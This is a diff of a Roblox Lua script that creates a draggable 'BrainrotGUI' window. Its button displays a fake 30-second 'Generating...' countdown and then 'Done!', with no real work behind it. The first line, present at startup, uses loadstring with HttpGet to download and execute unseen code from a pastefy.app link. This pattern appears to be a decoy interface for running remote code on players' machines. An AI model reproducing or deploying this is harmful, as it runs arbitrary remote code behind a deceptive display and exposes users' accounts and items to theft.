@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://pastefy.app/0oa0HgKh/raw"))()
+--// Create ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "BrainrotGUI"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -9,11 +10,8 @@ Frame.Size = UDim2.new(0, 320, 0, 180)
 Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
 Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 Frame.BorderSizePixel = 0
-Frame.Active = true -- REQUIRED FOR DRAGGING
-Frame.Draggable = true -- SIMPLE DRAG SYSTEM
 Frame.Parent = ScreenGui
 
---// Rounded corners
 Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
 
 --// Gradient
@@ -47,26 +45,57 @@ Button.Parent = Frame
 
 Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
 
---// Timer (HIDDEN at start)
-local Timer = Instance.new("TextLabel")
-Timer.Size = UDim2.new(1, 0, 0, 30)
-Timer.Position = UDim2.new(0, 0, 0.75, 0)
-Timer.BackgroundTransparency = 1
-Timer.Text = ""
-Timer.Visible = false -- hidden initially
-Timer.Font = Enum.Font.Gotham
-Timer.TextSize = 16
-Timer.TextColor3 = Color3.fromRGB(255,255,255)
-Timer.Parent = Frame
+--// PROPER DRAG SYSTEM
+local UIS = game:GetService("UserInputService")
+local dragging = false
+local dragStart, startPos
 
---// Click event
+Frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = Frame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - dragStart
+		Frame.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+--// BUTTON CLICK (CREATE TIMER ONLY AFTER CLICK)
 Button.MouseButton1Click:Connect(function()
-	Timer.Visible = true
-	
+
+	-- prevent multiple timers
+	if Frame:FindFirstChild("Timer") then return end
+
+	local Timer = Instance.new("TextLabel")
+	Timer.Name = "Timer"
+	Timer.Size = UDim2.new(1, 0, 0, 30)
+	Timer.Position = UDim2.new(0, 0, 0.75, 0)
+	Timer.BackgroundTransparency = 1
+	Timer.Font = Enum.Font.Gotham
+	Timer.TextSize = 16
+	Timer.TextColor3 = Color3.fromRGB(255,255,255)
+	Timer.Parent = Frame
+
 	for i = 30, 0, -1 do
 		Timer.Text = "Generating... " .. i .. "s"
 		task.wait(1)
 	end
-	
+
 	Timer.Text = "Done!"
 end)
